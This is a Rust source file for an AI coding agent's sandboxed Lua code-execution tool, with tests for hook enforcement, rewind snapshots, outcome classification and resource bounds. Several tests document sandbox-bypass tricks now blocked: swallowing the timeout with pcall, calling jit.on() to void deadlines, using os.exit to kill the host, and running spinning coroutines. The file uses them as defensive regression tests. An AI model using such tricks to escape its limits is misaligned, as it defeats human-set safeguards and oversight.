/// `return string.rep('x', 20000000)` a 20 MB tool result — 667× the cap, no
/// spill file, no truncation notice — straight into the history and the next
/// provider request.
///
/// Output overflow is deliberately not a failure kind: a program that printed
/// more than [`MAX_OUTPUT_BYTES`] succeeded, and the installed spill sink turns
/// the overflow into a success carrying a path. Marking it a failure would
/// teach the model that a correct program was wrong.
fn render(
    kind: Kind,
    outcome: ProgramOutcome,
    ledger: &[CallRecord],
    denial: Option<&Denial>,
    compute: Duration,
    budget: Duration,
) -> Result<ToolOutput, ToolError> {
    let (printed, returned, message) = match outcome {
        ProgramOutcome::Compiled(message) => (String::new(), String::new(), message),
        ProgramOutcome::Threw { printed, message } => (printed, String::new(), message),
        ProgramOutcome::Ok { printed, returned } => (printed, returned, String::new()),
    };
    let printed = truncate_output(printed, MAX_OUTPUT_BYTES);

    let calls = ledger.len();
    let header = match kind {
        Kind::Ok => format!(
            "run_code ok ({}, {:.2}s compute)",
            plural(calls, "tool call"),
            compute.as_secs_f64()
        ),
        Kind::Compile => "run_code compile: nothing in this program ran".to_string(),
        Kind::Error => format!(
            "run_code error: the program raised (after {})",
            plural(calls, "tool call")
        ),
        Kind::Denied => "run_code denied: a tool call inside the program was refused".to_string(),
        Kind::Time => format!(
            "run_code time: exceeded the {}s compute budget",
            budget.as_secs()
        ),
        Kind::Memory => format!(
            "run_code memory: exceeded the {} MB budget",
            MEMORY_LIMIT / (1024 * 1024)
        ),
        Kind::Calls => format!("run_code calls: more than {CALL_BUDGET} tool calls"),
        Kind::Interrupted => "run_code interrupted: the user stopped the turn".to_string(),
    };

    let mut body = header;
    if kind == Kind::Ok {
        // The section is omitted entirely when there is nothing to put in it
        // and the ledger is not empty, so a program that only acted does not
        // carry a blank heading.
        let shown: Option<std::borrow::Cow<'_, str>> = if !printed.trim().is_empty() {
            Some(std::borrow::Cow::Borrowed(printed.as_str()))
        } else if !returned.trim().is_empty() {
            // Truncated here rather than beside `printed` so a program that
            // printed its results does not also spill an unread return value
            // to disk.
            Some(std::borrow::Cow::Owned(truncate_output(
                returned,
                MAX_OUTPUT_BYTES,
            )))
        } else if ledger.is_empty() {
            Some(std::borrow::Cow::Borrowed("(nothing printed)"))
        } else {
            None
        };
        if let Some(shown) = shown {
            body.push_str("\n\noutput:\n");
            body.push_str(shown.trim_end());
        }
        if !ledger.is_empty() {
            body.push_str("\n\ncalls:\n");
            body.push_str(&render_ledger(ledger));
        }
        return Ok(ToolOutput::ok(body));
    }

    match (kind, denial) {
        (Kind::Denied, Some(denial)) => {
            body.push('\n');
            body.push_str(&denial.reason);
            body.push_str(&format!("\nat tool.{}{}", denial.tool, denial.args));
        }
        _ => {
            if !message.trim().is_empty() {
                body.push('\n');
                body.push_str(message.trim_end());
            }
        }
    }
    if !printed.trim().is_empty() {
        body.push_str("\n\noutput before the failure:\n");
        body.push_str(printed.trim_end());
    }
    if !ledger.is_empty() {
        body.push_str("\n\ncalls that already ran:\n");
        body.push_str(&render_ledger(ledger));
    }

    // `compile` is the one `Fault` in the list, and it is a fault because that
    // is literally what it is: the argument would not parse, so nothing
    // happened. It also means a model that cannot write Lua is nudged at three
    // identical repeats and stopped at six, which is the correct speed. Every
    // other kind is `Reported`: `error()` is a model's `exit 1`, and three
    // deliberate throws must not walk a sovereign run toward a circuit breaker.
    if kind == Kind::Compile {
        // The dispatcher renders a `ToolError` through its `Display`, so what
        // the model actually reads is "invalid arguments for 'run_code':
        // run_code compile: …". The tool name is said twice and that is the
        // accepted cost: every kind has to carry the same `run_code <kind>:`
        // header, because that token is what the model is told to key on, and a
        // header that changes shape for the one kind graded as a fault is worse
        // than a repeated word.
        return Err(ToolError::InvalidArgs {
            tool: RUN_CODE_TOOL_NAME.to_string(),
            message: body,
        });
    }
    Ok(ToolOutput::error(body))
}

fn render_ledger(ledger: &[CallRecord]) -> String {
    let mut out = String::new();
    for (index, record) in ledger.iter().take(LEDGER_LINES).enumerate() {
        let result = match record.result {
            RecordResult::Ok(bytes) => format!("ok, {bytes} bytes"),
            RecordResult::Reported(bytes) => format!("reported, {bytes} bytes"),
            RecordResult::Denied => "denied".to_string(),
        };
        out.push_str(&format!(
            "  {} {} {} -> {result}\n",
            index + 1,
            record.name,
            record.args
        ));
    }
    if ledger.len() > LEDGER_LINES {
        out.push_str(&format!("  ... and {} more\n", ledger.len() - LEDGER_LINES));
    }
    out.trim_end().to_string()
}

/// A call's arguments as one short JSON line, for the ledger and the denial.
fn short_args(args: &Value) -> String {
    let mut text = serde_json::to_string(args).unwrap_or_else(|_| "{}".to_string());
    if text.chars().count() > LEDGER_ARG_CHARS {
        text = text.chars().take(LEDGER_ARG_CHARS).collect::<String>() + "…";
    }
    text
}

fn plural(count: usize, noun: &str) -> String {
    if count == 1 {
        format!("{count} {noun}")
    } else {
        format!("{count} {noun}s")
    }
}

#[cfg(test)]
mod tests {
    use std::sync::atomic::AtomicBool;

    use serde_json::json;

    use super::*;
    use crate::agent::CancelHandle;
    use crate::config::Mode;
    use crate::dispatch::{IDENTICAL_FAULT_TRIP, TOOL_FAILURE_TRIP};
    use crate::hooks::{HookDef, HookEvent};
    use crate::tools::file::{EditFileTool, ReadFileTool, WriteFileTool};

    /// Temp project root removed on drop.
    struct TempDir(PathBuf);

    impl TempDir {
        fn new(label: &str) -> Self {
            let dir =
                std::env::temp_dir().join(format!("wizard-code-{label}-{}", uuid::Uuid::new_v4()));
            std::fs::create_dir_all(&dir).expect("create temp dir");
            Self(dir)
        }

        fn path(&self, rel: &str) -> PathBuf {
            self.0.join(rel)
        }
    }

    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    /// A registry holding the real file tools plus whatever the test adds.
    fn registry(extra: Vec<Arc<dyn Tool>>) -> Arc<ToolRegistry> {
        let mut registry = ToolRegistry::new();
        registry.register(Arc::new(ReadFileTool));
        registry.register(Arc::new(WriteFileTool));
        registry.register(Arc::new(EditFileTool));
        for tool in extra {
            registry.register(tool);
        }
        Arc::new(registry)
    }

    fn hooks(dir: &Path, defs: Vec<HookDef>) -> Arc<HookEngine> {
        Arc::new(HookEngine::new(
            defs,
            dir.to_path_buf(),
            "code-test".to_string(),
        ))
    }

    /// A program that really does hold memory.
    ///
    /// The obvious script — `t[#t+1] = string.rep('x', 1e6)` — allocates almost
    /// nothing: LuaJIT interns strings, so every iteration stores a reference to
    /// the same one megabyte and only the table grows. A test written that way
    /// measures table growth and passes or fails on interpreter speed. The key
    /// has to vary for the bytes to be new.
    const GREEDY: &str = "local t = {}\nlocal i = 0\n         while true do i = i + 1 t[i] = string.rep(tostring(i) .. 'x', 20000) end";

    fn blocking_hook(tool: &str) -> HookDef {
        HookDef {
            event: HookEvent::PreToolUse,
            matcher: Some(tool.to_string()),
            // Exit 2 is the veto.
            command: "exit 2".to_string(),
            timeout_secs: Some(5),
        }
    }

    /// Run `code` and hand back whatever the tool returned.
    async fn run(
        tool: &RunCodeTool,
        ctx: &ToolContext,
        code: &str,
    ) -> Result<ToolOutput, ToolError> {
        tool.execute(json!({ "code": code }), ctx).await
    }

    async fn run_with_budget(
        tool: &RunCodeTool,
        ctx: &ToolContext,
        code: &str,
        secs: u64,
    ) -> Result<ToolOutput, ToolError> {
        tool.execute(json!({ "code": code, "timeout_secs": secs }), ctx)
            .await
    }

    /// The header token, so a test asserts on the taxonomy rather than on prose.
    ///
    /// Scanned out of the first line rather than taken from a fixed position:
    /// the one kind graded as a fault comes back as a `ToolError`, and the
    /// dispatcher prefixes its `Display` before the header (see [`render`]).
    fn header_token(first_line: &str) -> String {
        first_line
            .split_whitespace()
            .skip_while(|word| *word != RUN_CODE_TOOL_NAME)
            .nth(1)
            .unwrap_or_default()
            .trim_end_matches(':')
            .to_string()
    }

    fn kind_of(result: &Result<ToolOutput, ToolError>) -> String {
        header_token(body_of(result).lines().next().unwrap_or_default())
    }

    fn body_of(result: &Result<ToolOutput, ToolError>) -> String {
        match result {
            Ok(out) => out.content.clone(),
            Err(ToolError::InvalidArgs { message, .. }) => message.clone(),
            Err(other) => format!("{other:#}"),
        }
    }

    /// A tool the test drives: it records the context it saw, counts calls,
    /// watches for overlap, and answers however the test asked it to.
    struct Probe {
        name: &'static str,
        /// Milliseconds to sleep before answering.
        sleep_ms: u64,
        /// Answer with a `ToolError` (a dispatch `Fault`) instead of output.
        fault: bool,
        /// Answer with `ToolOutput::error` (a `Reported` failure).
        reported: bool,
        calls: Arc<AtomicUsize>,
        in_flight: Arc<AtomicUsize>,
        max_in_flight: Arc<AtomicUsize>,
        saw_events: Arc<Mutex<Vec<bool>>>,
    }

    impl Probe {
        fn new(name: &'static str) -> Self {
            Self {
                name,
                sleep_ms: 0,
                fault: false,
                reported: false,
                calls: Arc::new(AtomicUsize::new(0)),
                in_flight: Arc::new(AtomicUsize::new(0)),
                max_in_flight: Arc::new(AtomicUsize::new(0)),
                saw_events: Arc::new(Mutex::new(Vec::new())),
            }
        }
    }

    #[async_trait]
    impl Tool for Probe {
        fn name(&self) -> &str {
            self.name
        }
        fn description(&self) -> &str {
            "test probe"
        }
        fn parameters(&self) -> Value {
            json!({ "type": "object", "properties": {} })
        }
        async fn execute(&self, _args: Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
            self.calls.fetch_add(1, Ordering::SeqCst);
            self.saw_events
                .lock()
                .unwrap_or_else(PoisonError::into_inner)
                .push(ctx.events.is_some());
            let now = self.in_flight.fetch_add(1, Ordering::SeqCst) + 1;
            self.max_in_flight.fetch_max(now, Ordering::SeqCst);
            if self.sleep_ms > 0 {
                tokio::time::sleep(Duration::from_millis(self.sleep_ms)).await;
            }
            self.in_flight.fetch_sub(1, Ordering::SeqCst);
            if self.fault {
                return Err(ToolError::InvalidArgs {
                    tool: self.name.to_string(),
                    message: "this probe refuses every call".to_string(),
                });
            }
            if self.reported {
                return Ok(ToolOutput::error("the probe ran and reported failure"));
            }
            Ok(ToolOutput::ok("probe ok"))
        }
    }

    // -- the property the whole design exists for --------------------------

    /// **No second dispatch path appeared.** A `pre_tool_use` hook that vetoes
    /// `write_file` vetoes it for a Lua program too, because the program's call
    /// goes through the same [`Dispatcher`] the model's would.
    #[tokio::test(flavor = "multi_thread")]
    async fn an_inner_call_goes_through_the_hook_engine() {
        let tmp = TempDir::new("hooked");
        let tool = RunCodeTool::new(
            registry(Vec::new()),
            hooks(&tmp.0, vec![blocking_hook("write_file")]),
        );
        let ctx = ToolContext::new(&tmp.0);

        let result = run(
            &tool,
            &ctx,
            r#"tool.write_file{path = "blocked.txt", content = "x"}"#,
        )
        .await;

        assert!(
            !tmp.path("blocked.txt").exists(),
            "the hook vetoed the call and the file must not exist"
        );
        assert_eq!(kind_of(&result), "denied", "{}", body_of(&result));
        let body = body_of(&result);
        assert!(
            body.contains("pre_tool_use hook"),
            "the refusal has to name itself: {body}"
        );
        assert!(
            body.contains("at tool.write_file"),
            "and name the call it refused: {body}"
        );
        assert!(result.expect("reported, not faulted").is_error);
    }

    /// A program's edits are snapshotted under the *parent's* turn, so
    /// `/rewind` undoes them.
    ///
    /// This is the clone-not-new property. `ToolContext::new(&ctx.cwd)` for the
    /// inner context compiles, passes every other test in this file, and
    /// silently drops checkpoint coverage for everything a program edits — the
    /// one feature Wizard sells as reversible.
    #[tokio::test(flavor = "multi_thread")]
    async fn an_inner_edit_is_snapshotted_for_rewind() {
        let tmp = TempDir::new("rewind");
        std::fs::write(tmp.path("subject.txt"), "before\n").unwrap();
        let store = Arc::new(crate::checkpoint::CheckpointStore::open(&tmp.0, 10));
        let turn = store.begin_turn();
        let ctx = ToolContext::new(&tmp.0).with_checkpoints(Arc::clone(&store));
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));

        let result = run(
            &tool,
            &ctx,
            r#"tool.edit_file{path = "subject.txt", old_string = "before", new_string = "after"}"#,
        )
        .await;
        assert_eq!(kind_of(&result), "ok", "{}", body_of(&result));
        assert_eq!(
            std::fs::read_to_string(tmp.path("subject.txt")).unwrap(),
            "after\n"
        );

        let turns = store.recent_turns(5);
        let snapshotted = turns
            .iter()
            .find(|t| t.turn == turn)
            .map(|t| t.files.clone())
            .unwrap_or_default();
        assert!(
            snapshotted.iter().any(|p| p.ends_with("subject.txt")),
            "a program's edit must be rewindable under the parent's turn: {snapshotted:?}"
        );
    }

    /// A pre-tool hook that rewrites arguments rewrites a program's too, and
    /// the write lands where the hook said.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_pre_tool_hook_can_rewrite_an_inner_calls_arguments() {
        let tmp = TempDir::new("rewrite");
        let rewrite = HookDef {
            event: HookEvent::PreToolUse,
            matcher: Some("write_file".to_string()),
            command:
                r#"echo '{"updated_args": {"path": "rewritten.txt", "content": "from the hook"}}'"#
                    .to_string(),
            timeout_secs: Some(5),
        };
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, vec![rewrite]));
        let ctx = ToolContext::new(&tmp.0);

        let result = run(
            &tool,
            &ctx,
            r#"tool.write_file{path = "original.txt", content = "from the program"}"#,
        )
        .await;
        assert_eq!(kind_of(&result), "ok", "{}", body_of(&result));
        assert!(
            !tmp.path("original.txt").exists(),
            "the hook redirected the write"
        );
        assert_eq!(
            std::fs::read_to_string(tmp.path("rewritten.txt")).unwrap(),
            "from the hook"
        );
    }

    // -- the taxonomy ------------------------------------------------------

    /// Every outcome is told apart by its header token, carries the right
    /// `is_error`, and earns the right [`Grade`] from a real [`Dispatcher`].
    ///
    /// The grade is the half that matters to a long run: exactly one of these
    /// may be a `Fault`, because a `Fault` streak is what ends a sovereign turn
    /// on a circuit breaker.
    #[tokio::test(flavor = "multi_thread")]
    async fn the_eight_outcomes_are_distinguishable() {
        use crate::agent::turn::Sink;
        use crate::llm::ToolCall;

        struct Case {
            kind: &'static str,
            code: &'static str,
            budget: u64,
            grade: Grade,
            is_error: bool,
            cancelled: bool,
        }

        let cases = [
            Case {
                kind: "ok",
                code: "print('fine')",
                budget: 30,
                grade: Grade::Fine,
                is_error: false,
                cancelled: false,
            },
            Case {
                kind: "compile",
                code: "this is not lua at all",
                budget: 30,
                grade: Grade::Fault,
                is_error: true,
                cancelled: false,
            },
            Case {
                kind: "error",
                code: "error('boom')",
                budget: 30,
                grade: Grade::Reported,
                is_error: true,
                cancelled: false,
            },
            Case {
                kind: "denied",
                code: "tool.refuse{}",
                budget: 30,
                grade: Grade::Reported,
                is_error: true,
                cancelled: false,
            },
            Case {
                kind: "time",
                code: "while true do end",
                budget: 1,
                grade: Grade::Reported,
                is_error: true,
                cancelled: false,
            },
            Case {
                kind: "memory",
                code: GREEDY,
                budget: 60,
                grade: Grade::Reported,
                is_error: true,
                cancelled: false,
            },
            Case {
                kind: "calls",
                code: "for i = 1, 10000 do tool.probe{} end",
                budget: 60,
                grade: Grade::Reported,
                is_error: true,
                cancelled: false,
            },
            Case {
                kind: "interrupted",
                code: "while true do end",
                budget: 30,
                grade: Grade::Reported,
                is_error: true,
                cancelled: true,
            },
        ];

        for case in cases {
            let tmp = TempDir::new(&format!("kind-{}", case.kind));
            let mut refuse = Probe::new("refuse");
            refuse.fault = true;
            let inner = registry(vec![Arc::new(refuse), Arc::new(Probe::new("probe"))]);
            let hooks = hooks(&tmp.0, Vec::new());
            let mut outer = ToolRegistry::new();
            outer.register(Arc::new(RunCodeTool::new(inner, Arc::clone(&hooks))));

            let cancel = CancelHandle::default();
            if case.cancelled {
                cancel.cancel();
            }
            let ctx = ToolContext::new(&tmp.0).with_cancel(cancel);
            let mut dispatcher = Dispatcher::new(
                outer,
                Mode::Sovereign,
                hooks,
                Arc::new(AtomicBool::new(false)),
            );
            let (tx, _rx) = tokio::sync::mpsc::channel(64);
            let sink = Sink::Turn(tx);
            let call = ToolCall::new(
                RUN_CODE_TOOL_NAME,
                json!({ "code": case.code, "timeout_secs": case.budget }),
            );
            let outcome = dispatcher.dispatch(&call, &ctx, &sink).await;
            let output = outcome.output.expect("a result");
            let token = header_token(output.content.lines().next().unwrap_or_default());
            assert_eq!(token, case.kind, "header: {}", output.content);
            assert_eq!(
                output.is_error, case.is_error,
                "{}: {}",
                case.kind, output.content
            );
            assert_eq!(
                outcome.grade, case.grade,
                "{} must grade {:?}: {}",
                case.kind, case.grade, output.content
            );
        }
    }

    /// Parsing strictly precedes execution, so "nothing in this program ran" is
    /// true by construction rather than by claim.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_syntax_error_runs_nothing() {
        let tmp = TempDir::new("syntax");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run(
            &tool,
            &ctx,
            "tool.write_file{path = \"early.txt\", content = \"x\"}\nlocal = = =",
        )
        .await;
        assert_eq!(kind_of(&result), "compile", "{}", body_of(&result));
        assert!(
            !tmp.path("early.txt").exists(),
            "the first statement must not have run"
        );
        assert!(
            matches!(result, Err(ToolError::InvalidArgs { .. })),
            "a program that will not parse is an invalid argument"
        );
    }

    /// A failure reports what already happened, because the model's next move
    /// depends on it. Without the ledger the safe retry and the double write
    /// look identical from where the model sits.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_runtime_error_reports_the_calls_that_already_ran() {
        let tmp = TempDir::new("ledger");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run(
            &tool,
            &ctx,
            "tool.write_file{path = \"done.txt\", content = \"landed\"}\nerror('after the write')",
        )
        .await;
        assert_eq!(kind_of(&result), "error", "{}", body_of(&result));
        assert_eq!(
            std::fs::read_to_string(tmp.path("done.txt")).unwrap(),
            "landed",
            "the write really happened"
        );
        let body = body_of(&result);
        assert!(
            body.contains("calls that already ran:"),
            "the ledger has to be there: {body}"
        );
        assert!(
            body.contains("1 write_file"),
            "and has to name the write: {body}"
        );
        assert!(body.contains("after the write"), "{body}");
    }

    /// Everything printed before the failure survives it. It is usually the
    /// only evidence of where the program got to.
    #[tokio::test(flavor = "multi_thread")]
    async fn output_produced_before_a_failure_survives_it() {
        let tmp = TempDir::new("printed");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run(&tool, &ctx, "print('before')\nerror('boom')").await;
        let body = body_of(&result);
        assert!(body.contains("output before the failure:"), "{body}");
        assert!(body.contains("before"), "{body}");
        assert!(body.contains("boom"), "{body}");
    }

    /// `error()` is a model's `exit 1`. Three deliberate throws must not walk a
    /// sovereign run toward ending on a circuit breaker, which is exactly the
    /// bug `src/dispatch.rs` exists to prevent for `execute`.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_thrown_error_is_reported_not_faulted() {
        let ended = repeat_program("error('deliberate')", IDENTICAL_FAULT_TRIP).await;
        assert!(
            ended.iter().all(Option::is_none),
            "a thrown error must not trip the identical-fault breaker: {ended:?}"
        );
    }

    /// The mirror: a program that will not compile is a fault, and an identical
    /// repeat of one trips at the shorter leash, because nothing happened and
    /// repeating it teaches the model nothing.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_syntax_error_faults() {
        let ended = repeat_program("local = = =", IDENTICAL_FAULT_TRIP + 2).await;
        assert_eq!(
            ended.len(),
            IDENTICAL_FAULT_TRIP as usize,
            "the identical-fault breaker ends it at {IDENTICAL_FAULT_TRIP}: {ended:?}"
        );
        assert_eq!(
            ended.last().copied().flatten(),
            Some(crate::agent::DoneReason::CircuitBreaker)
        );
    }

    /// Dispatch the same program `rounds` times through a real sovereign
    /// dispatcher, in the shape of `dispatch::tests::repeat`.
    async fn repeat_program(code: &str, rounds: u32) -> Vec<Option<crate::agent::DoneReason>> {
        use crate::agent::turn::Sink;
        use crate::llm::ToolCall;

        let tmp = TempDir::new("repeat");
        let hooks = hooks(&tmp.0, Vec::new());
        let ctx = ToolContext::new(&tmp.0);
        let mut outer = ToolRegistry::new();
        outer.register(Arc::new(RunCodeTool::new(
            registry(Vec::new()),
            Arc::clone(&hooks),
        )));
        let mut dispatcher = Dispatcher::new(
            outer,
            Mode::Sovereign,
            hooks,
            Arc::new(AtomicBool::new(false)),
        );
        let (tx, _rx) = tokio::sync::mpsc::channel(256);
        let sink = Sink::Turn(tx);
        let call = ToolCall::new(RUN_CODE_TOOL_NAME, json!({ "code": code }));

        let mut seen = Vec::new();
        for _ in 0..rounds {
            let outcome = dispatcher.dispatch(&call, &ctx, &sink).await;
            seen.push(outcome.done);
            if outcome.done.is_some() {
                break;
            }
        }
        assert!(
            rounds <= TOOL_FAILURE_TRIP,
            "keep the round count under the per-tool backstop or it is what ends the run"
        );
        seen
    }

    // -- the bounds --------------------------------------------------------

    /// The budget is compute time. A program that runs a two-minute build must
    /// not blow a thirty-second budget while parked on the bridge, or the model
    /// learns to write shorter programs to route around a bug.
    #[tokio::test(flavor = "multi_thread")]
    async fn the_compute_budget_excludes_time_spent_in_a_tool_call() {
        let tmp = TempDir::new("parked");
        let mut slow = Probe::new("slow");
        slow.sleep_ms = 400;
        let tool = RunCodeTool::new(registry(vec![Arc::new(slow)]), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        // Four calls at 400ms is 1.6s parked against a 1s budget. The compute
        // in between is microseconds, so this only passes if parked time does
        // not count.
        let result = run_with_budget(
            &tool,
            &ctx,
            "for i = 1, 4 do tool.slow{} end\nprint('finished')",
            1,
        )
        .await;
        assert_eq!(kind_of(&result), "ok", "{}", body_of(&result));
        assert!(body_of(&result).contains("finished"));
    }

    /// **The bound survives `pcall`.** The tool's own description tells the
    /// model to wrap calls in `pcall`, so a bound signalled as a catchable Lua
    /// error was a bound the idiom the feature encourages turns into a return
    /// value: this program used to spin forever with `execute` never returning,
    /// no Ctrl-C, and a core burned for the life of the process.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_bound_cannot_be_swallowed_by_pcall() {
        let tmp = TempDir::new("pcallbound");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let started = Instant::now();
        let result = run_with_budget(
            &tool,
            &ctx,
            "while true do pcall(function() while true do end end) end",
            1,
        )
        .await;
        assert!(
            started.elapsed() < Duration::from_secs(20),
            "the program caught its own bound and carried on: {:?}",
            started.elapsed()
        );
        assert_eq!(kind_of(&result), "time", "{}", body_of(&result));
    }

    /// A program that catches its bound and then *returns normally* is still
    /// reported as stopped. It used to come back `run_code ok`, with the
    /// timeout printed in the output body as though the program had said it.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_program_that_caught_its_bound_is_not_reported_ok() {
        let tmp = TempDir::new("caught");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run_with_budget(
            &tool,
            &ctx,
            "pcall(function() while true do end end)\nprint('and carried on')",
            1,
        )
        .await;
        assert_eq!(kind_of(&result), "time", "{}", body_of(&result));
        assert!(
            result.expect("reported, not faulted").is_error,
            "and it is a failure, not a success carrying a failure message"
        );
    }

    /// A program's own `error()` is still catchable. The guard above must only
    /// fire on a latched bound, or `pcall` stops meaning what Lua says it means
    /// and every probing idiom in the description breaks.
    #[tokio::test(flavor = "multi_thread")]
    async fn pcall_still_catches_an_ordinary_error() {
        let tmp = TempDir::new("stillcatches");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run(
            &tool,
            &ctx,
            "local ok, err = pcall(function() error('mine') end)\nprint(tostring(ok), err)",
        )
        .await;
        assert_eq!(kind_of(&result), "ok", "{}", body_of(&result));
        assert!(body_of(&result).contains("false"), "{}", body_of(&result));
    }

    /// A coroutine the program creates is bounded like anything else.
    ///
    /// mlua's per-thread hook is keyed by thread in a registry table, and its
    /// trampoline uninstalls the hook when it cannot find the thread — which on
    /// LuaJIT, where the hook mask is global state, took the bounds away from
    /// the whole VM. This spun forever with no `pcall` and no `jit` involved.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_coroutine_is_bounded_too() {
        let tmp = TempDir::new("coroutine");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let started = Instant::now();
        let result = run_with_budget(
            &tool,
            &ctx,
            "local co = coroutine.create(function() while true do end end)\ncoroutine.resume(co)",
            1,
        )
        .await;
        assert!(
            started.elapsed() < Duration::from_secs(20),
            "a coroutine escaped the bounds: {:?}",
            started.elapsed()
        );
        assert_eq!(kind_of(&result), "time", "{}", body_of(&result));
    }

    /// The compiler cannot be turned back on from inside a program.
    ///
    /// `install_bounds` turns the JIT off because a compiled trace does not
    /// check the count hook, so `jit.on()` — eight characters — used to void the
    /// deadline, the wall ceiling and the cancel handle all at once and wedge
    /// the turn permanently. `jit.version` survives, because `wizard.version`
    /// reads it.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_program_cannot_turn_the_compiler_back_on() {
        let tmp = TempDir::new("jit");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let probe = run(
            &tool,
            &ctx,
            "print(tostring(jit.on), tostring(jit.status()), tostring(jit.version ~= nil))",
        )
        .await;
        let body = body_of(&probe);
        assert!(body.contains("nil\tfalse\ttrue"), "{body}");

        let started = Instant::now();
        let spin = run_with_budget(
            &tool,
            &ctx,
            "pcall(function() jit.on() end)\nlocal n = 0\nwhile true do n = n + 1 end",
            1,
        )
        .await;
        assert!(
            started.elapsed() < Duration::from_secs(20),
            "the bounds were voided: {:?}",
            started.elapsed()
        );
        assert_eq!(kind_of(&spin), "time", "{}", body_of(&spin));
    }

    /// `os.exit` is gone. Everything else in `os` stays, because a program that
    /// can call `tool.execute` gains nothing from losing `os.execute` — but
    /// there is no `tool.exit`, so this is the one call that reaches past the
    /// bounds and takes the whole process with it. `os.exit(3)` really did end
    /// the host, TUI and session included, with nothing reported to anyone.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_program_cannot_exit_the_host() {
        let tmp = TempDir::new("osexit");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run(&tool, &ctx, "print('still here')\nos.exit(3)").await;
        assert_eq!(kind_of(&result), "error", "{}", body_of(&result));
        assert!(body_of(&result).contains("still here"));

        let kept = run(
            &tool,
            &ctx,
            "print(type(os.time), type(os.getenv), type(os.execute))",
        )
        .await;
        assert!(
            body_of(&kept).contains("function\tfunction\tfunction"),
            "the rest of os is untouched: {}",
            body_of(&kept)
        );
    }

    /// A program parked in a C call cannot be stopped from inside — the hook
    /// does not fire there, and `SECURITY.md` says so. What must not happen is
    /// the turn never ending: the host stops waiting a grace period after the
    /// budget, reports what the program printed, and leaves the thread to
    /// finish in its own time.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_program_wedged_in_a_c_call_does_not_wedge_the_turn() {
        let tmp = TempDir::new("ccall");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let started = Instant::now();
        let result =
            run_with_budget(&tool, &ctx, "print('before')\nos.execute('sleep 30')", 1).await;
        let elapsed = started.elapsed();
        assert!(
            elapsed < Duration::from_secs(15),
            "the turn waited on a chunk nothing can interrupt: {elapsed:?}"
        );
        assert!(
            elapsed >= BACKSTOP_GRACE,
            "and it did not give up before the in-VM stop had its chance: {elapsed:?}"
        );
        assert_eq!(kind_of(&result), "time", "{}", body_of(&result));
        assert!(
            body_of(&result).contains("before"),
            "what it printed survives: {}",
            body_of(&result)
        );
    }

    /// The same backstop carries Ctrl-C, which otherwise reaches a wedged
    /// program through neither the hook (it cannot fire) nor the pump (no
    /// request is coming).
    #[tokio::test(flavor = "multi_thread")]
    async fn cancelling_reaches_a_program_wedged_in_a_c_call() {
        let tmp = TempDir::new("ccancel");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let cancel = CancelHandle::default();
        let ctx = ToolContext::new(&tmp.0).with_cancel(cancel.clone());

        let raiser = tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(150)).await;
            cancel.cancel();
        });
        let started = Instant::now();
        let result = run_with_budget(&tool, &ctx, "os.execute('sleep 30')", 120).await;
        let _ = raiser.await;

        assert!(
            started.elapsed() < Duration::from_secs(15),
            "cancellation did not reach it: {:?}",
            started.elapsed()
        );
        assert_eq!(kind_of(&result), "interrupted", "{}", body_of(&result));
    }

    /// A program's *return value* is capped like its output. It used to be
    /// rendered raw, so `return string.rep('x', 20000000)` put a 20 MB tool
    /// result into the history and the next provider request — 667x the cap,
    /// with no spill file and no truncation notice.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_returned_value_is_capped_like_printed_output() {
        let tmp = TempDir::new("returned");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run(&tool, &ctx, "return string.rep('x', 2000000)").await;
        let output = result.expect("an oversized return value is still a success");
        assert!(!output.is_error, "{:.200}", output.content);
        assert!(
            output.content.len() < MAX_OUTPUT_BYTES * 2,
            "the return value went out uncapped: {} bytes",
            output.content.len()
        );
    }

    /// A spinning program is stopped, and what it printed before it started
    /// spinning comes back. Reporting the timeout as a `ToolError` would throw
    /// that away, and it is the only evidence of where it hung.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_spinning_program_is_stopped_and_reports_what_it_printed() {
        let tmp = TempDir::new("spin");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
